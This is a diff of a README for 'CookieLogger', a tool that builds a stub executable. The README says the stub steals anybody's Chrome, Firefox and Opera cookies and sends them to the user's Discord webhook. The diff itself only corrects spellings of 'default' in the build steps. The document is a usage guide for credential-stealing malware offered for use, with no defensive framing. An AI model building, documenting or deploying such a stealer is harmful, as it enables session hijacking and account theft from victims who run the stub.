@@ -34,9 +34,9 @@ Step 3; run the CookieLogger.exe file and wait until the gui opens
 
 Step 4; get your discord webhook and put it in the box that says WEBHOOK_HERE
 
-Step 5 (OPTINAL);  enter name {Deafault = Build.exe}
+Step 5 (OPTINAL);  enter name {Default = Build.exe}
 
-Step 7; Click Create Stub and wait until it finishes and then go to the folder where the cookielogger.exe is saved the stub should be there under the name you chose or the deaufalt name build.exe
+Step 7; Click Create Stub and wait until it finishes and then go to the folder where the cookielogger.exe is saved the stub should be there under the name you chose or the default name build.exe
 
 # What It Does
 Its a simple gui i made that creates a stub and it steals anybodys chrome, firefox, opera cookies
